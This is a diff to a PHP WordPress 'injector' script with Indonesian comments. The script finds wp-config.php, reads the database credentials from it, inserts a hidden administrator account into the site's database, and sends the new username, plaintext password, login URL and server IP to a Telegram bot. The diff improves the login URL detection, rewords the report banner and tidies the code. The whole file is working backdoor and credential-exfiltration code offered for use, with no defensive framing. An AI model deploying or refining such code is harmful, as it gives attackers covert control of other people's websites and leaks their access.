@@ -8,9 +8,11 @@ $pass  = $_POST['wp_pass'];
 $email = $_POST['wp_email'];
 
 // Fungsi Scan wp-config.php
+$currentPath = dirname(__FILE__);
 $search_path = $currentPath;
 $found_config = false;
-while($search_path !== dirname($search_path)) {
+
+while ($search_path !== dirname($search_path)) {
     if (file_exists($search_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
         $found_config = $search_path . DIRECTORY_SEPARATOR . 'wp-config.php';
         break;
@@ -29,7 +31,7 @@ if ($found_config) {
     preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $config_content, $db_prefix);
 
     $prefix = $db_prefix[1] ?? 'wp_';
-    $conn = new mysqli($db_host[1], $db_user[1], $db_pass[1], $db_name[1]);
+    $conn = new mysqli($db_host[1] ?? 'localhost', $db_user[1], $db_pass[1], $db_name[1]);
 
     if (!$conn->connect_error) {
         $md5_pass = md5($pass);
@@ -41,15 +43,27 @@ if ($found_config) {
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}user_level', '10')");
             
+            // === PERBAIKAN LINK LOGIN ===
+            $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+            $domain   = $_SERVER['HTTP_HOST'];
+            
+            // Ambil siteurl dari database (paling akurat)
+            $siteurl_result = $conn->query("SELECT option_value FROM `{$prefix}options` WHERE option_name = 'siteurl' LIMIT 1");
+            $login_url = $protocol . $domain . "/wp-login.php"; // default fallback
+            
+            if ($siteurl_result && $siteurl_result->num_rows > 0) {
+                $row = $siteurl_result->fetch_assoc();
+                $siteurl = rtrim($row['option_value'], '/');
+                $login_url = $siteurl . "/wp-login.php";
+            }
+
             $wp_msg = "SUCCESS: Admin '$user' injected into DB!";
 
             // --- KIRIM KE TELEGRAM ---
             $ip     = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST']);
-            $domain = $_SERVER['HTTP_HOST'];
             $date   = date('Y-m-d H:i:s');
-            $login_url = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $domain . "/wp-login.php";
 
-            $text = "💎 *AMETHYST WP INJECTOR REPORT* 💎\n\n";
+            $text = "💎 *INI YA BRO LOGINAN NYA !!* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
             $text .= "🔗 *Login:* " . $login_url . "\n";
@@ -61,8 +75,17 @@ if ($found_config) {
             @file_get_contents($url);
             // -------------------------
 
-        } else { $wp_msg = "ERROR: " . $conn->error; }
+        } else { 
+            $wp_msg = "ERROR: " . $conn->error; 
+        }
         $conn->close();
-    } else { $wp_msg = "DATABASE ERROR: Connection Failed."; }
-} else { $wp_msg = "ERROR: wp-config.php not found in path hierarchy."; }
+    } else { 
+        $wp_msg = "DATABASE ERROR: Connection Failed."; 
+    }
+} else { 
+    $wp_msg = "ERROR: wp-config.php not found in path hierarchy."; 
+}
+
+// Optional: tampilkan pesan (kalau dijalankan langsung)
+echo $wp_msg;
 ?>
